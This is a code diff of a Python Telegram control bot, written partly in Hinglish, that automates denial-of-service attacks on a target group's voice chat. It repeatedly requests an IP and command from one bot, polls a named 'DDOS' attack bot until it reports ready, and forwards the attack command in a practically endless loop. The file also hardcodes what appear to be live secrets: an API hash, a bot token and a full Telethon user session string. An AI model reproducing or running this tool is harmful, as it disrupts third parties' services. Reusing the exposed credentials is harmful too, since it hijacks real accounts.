@@ -14,283 +14,204 @@ from telegram.ext import (
 
 API_ID = 36295148
 API_HASH = "bee66be844e3be0e314508e92a7c4e7d"
-
 BOT_TOKEN = "8473172869:AAG1B8DvV4dwodGudTz11cBed2iq-DDReSY"
 
-# Telethon user session (TG test controller account)
+BOT_A = "@botbysahilbot"          # IP BOT
+BOT_B = "@DDOS_Aditya_xd_bot"     # Attack BOT
+
 STRING_SESSION = "1BVtsOKEBu502_IqKteaXEshN7yLh50dvjgNG7WFdv2SNMNtJOHSxj7RgTF5qUIIMziiQPAG5irsAx37rfUZra0WJqTRjSox2F7NSUqUi9_bSizm3sfw3Ez5GszsCnrgY7IVixINZgjWQobFkg4JmOePZb14z6XNO1e1oqNQ_oxugaQN0cBB3IWaH0BaY4G8-O4IfF3GsY_QIbFlLdJeLCxIA6Tah1SHTrTdK4reg_9Vig2snpHSri02cNdkoawDBk1QUyo3mL6r4v7uuO0b5w7LpwjCmJnvYUaWOH0uy14seFuaU4gSnQNvvz79sK_p8vQoZm6h2HLUIOwZLZRugWZ-_iRiaYiU="
-
-# Bot usernames (without @)
-BOT_A_USERNAME = "botbysahilbot"          # IP / CMD provider
-BOT_B_USERNAME = "DDOS_Aditya_xd_bot"     # Attack bot
-
-
-# --------------- GLOBALS ---------------
 
 tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
 
-BOT_A_ID = None
-BOT_B_ID = None
+# per-chat config
+chat_targets: dict[int, str] = {}      # /setlinkchatid
+chat_counts: dict[int, int] = {}       # total rounds (optional)
+loop_tasks: dict[int, asyncio.Task] = {}
 
-# per-chat state
-# keys: armed, bot_ready, running, current_cmd, pending_cmd, target
-chat_state: dict[int, dict] = {}
+# IP reply waiters
+ip_waiters: dict[int, asyncio.Future] = {}
 
-
-# --------------- FSM HELPERS ---------------
-
-async def try_execute(cid: int):
-    """Agar bot READY hai aur pending CMD hai to BOT_B ko attack command bhejo."""
-    state = chat_state.get(cid)
-    if not state:
-        return
-    if not state["armed"]:
-        return
-    if not state["bot_ready"]:
-        return
-    if not state["pending_cmd"]:
-        return
-    if not state["target"]:
-        return
-
-    cmd = state["pending_cmd"]
-
-    state["current_cmd"] = cmd
-    state["pending_cmd"] = None
-    state["running"] = True
-    state["bot_ready"] = False
-
-    print(f"[FSM {cid}] START CMD -> {cmd} | target={state['target']}")
-    try:
-        await tele.send_message(BOT_B_ID, cmd)
-        print(f"[FSM {cid}] SENT CMD to BOT_B OK")
-    except Exception as e:
-        print(f"[FSM {cid}] ERROR sending to BOT_B:", repr(e))
+# BOT_B status (updated by listener)
+bot_b_status = "UNKNOWN"
 
 
-async def cancel_task(cid: int):
-    """Current attack stop karo (BOT_B ko /stop)."""
-    state = chat_state.get(cid)
-    if not state or not state["running"]:
-        return
+# --------------- LISTENERS ---------------
 
-    print(f"[FSM {cid}] STOP CMD -> {state['current_cmd']}")
-    try:
-        await tele.send_message(BOT_B_ID, "/stop")
-    except Exception as e:
-        print(f"[FSM {cid}] ERROR sending /stop to BOT_B:", repr(e))
-
-    state["running"] = False
-    state["current_cmd"] = None
-
-
-# --------------- TELETHON LISTENERS ---------------
-
-@tele.on(events.NewMessage)
-async def tele_listener(event):
-    """BOT_A ke CMD aur BOT_B ke READY messages handle karta hai."""
-    global BOT_A_ID, BOT_B_ID
-
-    sender = await event.get_sender()
-    if not sender:
-        return
-
-    sender_id = sender.id
+@tele.on(events.NewMessage(from_users=BOT_A))
+async def ip_bot_listener(event):
     text = event.text or ""
+    print("📩 IP BOT REPLY:", text)
 
-    # ------------ BOT A (IP / CMD provider) ------------
-    if BOT_A_ID is not None and sender_id == BOT_A_ID:
-        print("📩 IP BOT REPLY:", text)
-
-        # CMD line nikaalna (CMD:, **CMD:**, `CMD:` etc.)
-        m = re.search(r"CMD[:*s`]*s*(.+)", text, flags=re.IGNORECASE)
-        if not m:
-            return
-
-        cmd = m.group(1).strip()
-        cmd = cmd.replace("**", "").replace("`", "").strip()
-
-        print("✅ FINAL CMD:", cmd)
-
-        # sab chats jaha FSM armed hai
-        for cid, state in chat_state.items():
-            if not state["armed"]:
-                continue
-            if not state["target"]:
-                continue
-
-            # same CMD already running -> ignore
-            if cmd == state["current_cmd"]:
-                print(f"[FSM {cid}] Same CMD already running, ignore.")
-                continue
-
-            if state["running"]:
-                # naya command aaya, pehle stop queue karo
-                state["pending_cmd"] = cmd
-                print(f"[FSM {cid}] New CMD while running -> queue + /stop.")
-                await cancel_task(cid)
-            else:
-                state["pending_cmd"] = cmd
-                print(f"[FSM {cid}] Idle -> pending set, try_execute (if READY).")
-                await try_execute(cid)
-
-    # ------------ BOT B (attack bot / READY status) ------------
-    if BOT_B_ID is not None and sender_id == BOT_B_ID:
-        low = text.lower()
-        print("DDOS BOT MSG:", repr(text))
-
-        # READY message (no attack running)
-        is_ready = (
-            "ʀᴇᴀᴅʏ" in text
-            or "ɴᴏ ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ" in text
-            or "ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴀ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ" in text
-            or "no attack running" in low
-            or "you can start a new attack" in low
-        )
-
-        if not is_ready:
-            return
-
-        # READY milte hi, har armed chat ke liye:
-        for cid, state in chat_state.items():
-            if not state["armed"]:
-                continue
-
-            state["bot_ready"] = True
-
-            if state.get("pending_cmd"):
-                # agar queue me CMD hai to turant chalao
-                await try_execute(cid)
-            else:
-                # warna naya IP mang lo (VC end → fresh CMD)
-                target = state.get("target")
-                if not target:
-                    continue
-                msg = f".getip all {target}"
-                print(f"[FSM {cid}] READY -> AUTO SEND to BOT_A:", msg)
-                try:
-                    await tele.send_message(BOT_A_ID, msg)
-                except Exception as e:
-                    print(f"[FSM {cid}] ERROR sending to BOT_A on READY:", repr(e))
-
-
-# --------------- PTB COMMAND HANDLERS ---------------
-
-async def cmd_setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Attack target VC / chat set karta hai."""
-    cid = update.effective_chat.id
-
-    if not context.args:
-        await update.message.reply_text(
-            "Usage: /setlinkchatid <group_link_or_chatid>"
-        )
+    # CMD line nikaalna (CMD:, **CMD:**, `CMD:` etc.)
+    m = re.search(r"CMD[:*s`]*s*(.+)", text, flags=re.IGNORECASE)
+    if not m:
         return
 
-    target = " ".join(context.args).strip()
-    state = chat_state.get(cid)
+    final_cmd = m.group(1).strip()
+    final_cmd = final_cmd.replace("**", "").replace("`", "").strip()
 
-    if not state:
-        chat_state[cid] = {
-            "armed": False,
-            "bot_ready": False,
-            "running": False,
-            "current_cmd": None,
-            "pending_cmd": None,
-            "target": target,
-        }
+    print("✅ FINAL CMD:", final_cmd)
+
+    for chat_id, fut in list(ip_waiters.items()):
+        if not fut.done():
+            fut.set_result(final_cmd)
+        ip_waiters.pop(chat_id, None)
+
+
+@tele.on(events.NewMessage(from_users=BOT_B))
+async def bot_b_listener(event):
+    global bot_b_status
+    text = event.text or ""
+    low = text.lower()
+    print("DDOS BOT MSG:", repr(text))
+
+    if "✅ **ʀᴇᴀᴅʏ**" in text or "no attack running" in low or "you can start a new attack" in low:
+        bot_b_status = "READY"
+    elif "attack started" in low or "ᴀᴛᴛᴀᴄᴋ sᴛᴀʀᴛᴇᴅ" in low or "attack running" in low:
+        bot_b_status = "RUNNING"
+    elif "cooldown" in low or "⏳" in text:
+        bot_b_status = "COOLDOWN"
     else:
-        state["target"] = target
+        bot_b_status = "UNKNOWN"
 
-    await update.message.reply_text(
-        f"✅ Target saved for this chat:`{target}`",
+
+# --------------- CORE LOOP (STARTFSM) ---------------
+
+async def startfsm_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
+    global bot_b_status
+
+    target = chat_targets.get(chat_id)
+    if not target:
+        await context.bot.send_message(chat_id, "❌ Target not set, use /setlinkchatid first.")
+        return
+
+    count = chat_counts.get(chat_id, 999999999)  # practically infinite rounds
+
+    await context.bot.send_message(
+        chat_id,
+        f"🔁 FSM loop started.Target: `{target}`Rounds: {count if count < 10**9 else '∞'}",
         parse_mode="Markdown",
     )
 
+    for i in range(count):
+        await context.bot.send_message(
+            chat_id,
+            f"➡️ Round {i + 1}/{count if count < 10**9 else '∞'}:
+"
+            f"Sending `.getip all {target}` to IP BOT…",
+            parse_mode="Markdown",
+        )
 
-async def cmd_startfsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Event-driven FSM ON + BOT_A se auto .getip all."""
-    cid = update.effective_chat.id
-    old = chat_state.get(cid)
+        loop = asyncio.get_running_loop()
+        fut = loop.create_future()
+        ip_waiters[chat_id] = fut
 
-    chat_state[cid] = {
-        "armed": True,
-        "bot_ready": False,
-        "running": False,
-        "current_cmd": None,
-        "pending_cmd": None,
-        "target": old["target"] if old and "target" in old else None,
-    }
-    state = chat_state[cid]
-    target = state["target"]
+        # send .getip all
+        await tele.send_message(BOT_A, f".getip all {target}")
 
-    await update.message.reply_text(
-        '''✅ Event-driven mode ON.
-        • /setlinkchatid se target set karo.
-        • BOT_A (.getip) se jo CMD aayega wo auto parse hoga.
-        • BOT_B READY hote hi pending attack auto start hoga.
-        • VC end hone par READY → naya .getip all → auto new attack.
-        • Naya CMD aane par purana auto /stop + naya start.'''
-    )
-
-    # Agar target already set hai to abhi hi .getip all bhejo
-    if target:
-        msg = f".getip all {target}"
-        print(f"[FSM {cid}] AUTO SEND to BOT_A:", msg)
+        # wait CMD from IP bot
         try:
-            await tele.send_message(BOT_A_ID, msg)
-        except Exception as e:
-            print(f"[FSM {cid}] ERROR sending to BOT_A:", repr(e))
+            final_cmd = await asyncio.wait_for(fut, timeout=60)
+        except asyncio.TimeoutError:
+            await context.bot.send_message(
+                chat_id,
+                "⏱️ Timeout: No CMD from IP BOT, skipping this round…"
+            )
+            ip_waiters.pop(chat_id, None)
+            continue
+
+        await context.bot.send_message(
+            chat_id,
+            f"📥 IP BOT CMD received:`{final_cmd}`",
+            parse_mode="Markdown",
+        )
+
+        # wait until BOT_B READY (force /status)
+        await context.bot.send_message(
+            chat_id,
+            "🔎 Checking BOT_B `/status` until READY…"
+        )
+
+        while True:
+            await tele.send_message(BOT_B, "/status")
+            await asyncio.sleep(2)
+            if bot_b_status == "READY":
+                break
+            await context.bot.send_message(
+                chat_id,
+                f"⏸ BOT_B status: {bot_b_status} (waiting 5s…)"
+            )
+            await asyncio.sleep(5)
+
+        # send attack to BOT_B
+        await tele.send_message(BOT_B, final_cmd)
+        await context.bot.send_message(
+            chat_id,
+            f"🚀 Sent to BOT_B:`{final_cmd}`",
+            parse_mode="Markdown",
+        )
+
+        # small delay between rounds
+        await asyncio.sleep(3)
+
+    await context.bot.send_message(chat_id, "✅ FSM loop finished.")
+    loop_tasks.pop(chat_id, None)
 
 
-async def cmd_stopfsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """FSM OFF + running attack stop."""
+# --------------- PTB COMMANDS ---------------
+
+async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text("Usage: /setlinkchatid <group_link_or_chatid>")
+        return
+    chat_targets[update.effective_chat.id] = " ".join(context.args)
+    await update.message.reply_text("✅ Link / ChatID saved")
+
+async def setcount(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args or not context.args[0].isdigit():
+        await update.message.reply_text("Usage: /setcount <number_of_rounds>")
+        return
+    n = max(1, int(context.args[0]))
+    chat_counts[update.effective_chat.id] = n
+    await update.message.reply_text(f"✅ Rounds count set to {n}")
+
+async def startfsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cid = update.effective_chat.id
-    if cid in chat_state:
-        await cancel_task(cid)
-        chat_state.pop(cid, None)
+    if cid in loop_tasks:
+        await update.message.reply_text("⚠️ FSM loop already running")
+        return
+    task = asyncio.create_task(startfsm_loop(cid, context))
+    loop_tasks[cid] = task
+    await update.message.reply_text("🔁 FSM loop started")
 
-    await update.message.reply_text(
-        "🛑 Event-driven system stopped for this chat."
-    )
+async def stopfsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    cid = update.effective_chat.id
+    task = loop_tasks.pop(cid, None)
+    if task:
+        task.cancel()
+        await update.message.reply_text("🛑 FSM loop stopped")
+    else:
+        await update.message.reply_text("No active FSM loop running")
 
 
 # --------------- MAIN ---------------
 
 async def main():
-    global BOT_A_ID, BOT_B_ID
-
-    # Telethon start
     await tele.start()
-    print("Telethon connected")
+    print("🧵 Telethon connected")
 
-    # Resolve bot IDs
-    bot_a = await tele.get_entity(BOT_A_USERNAME)
-    bot_b = await tele.get_entity(BOT_B_USERNAME)
-    BOT_A_ID = bot_a.id
-    BOT_B_ID = bot_b.id
-    print("BOT_A_ID:", BOT_A_ID, "BOT_B_ID:", BOT_B_ID)
-
-    # PTB app
     app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("setlinkchatid", cmd_setlink))
-    app.add_handler(CommandHandler("startfsm", cmd_startfsm))
-    app.add_handler(CommandHandler("stopfsm", cmd_stopfsm))
+    app.add_handler(CommandHandler("setlinkchatid", setlink))
+    app.add_handler(CommandHandler("setcount", setcount))
+    app.add_handler(CommandHandler("startfsm", startfsm))
+    app.add_handler(CommandHandler("stopfsm", stopfsm))
 
-    print("Control bot running (event-driven)")
-
-    # Pure async startup – no nested event loops
+    print("🤖 Control bot running")
     await app.initialize()
     await app.start()
     await app.updater.start_polling()
-    print("PTB started")
 
-    try:
-        await tele.run_until_disconnected()
-    finally:
-        await app.updater.stop()
-        await app.stop()
-        await app.shutdown()
-
+    await tele.run_until_disconnected()
 
 if __name__ == "__main__":
     asyncio.run(main())
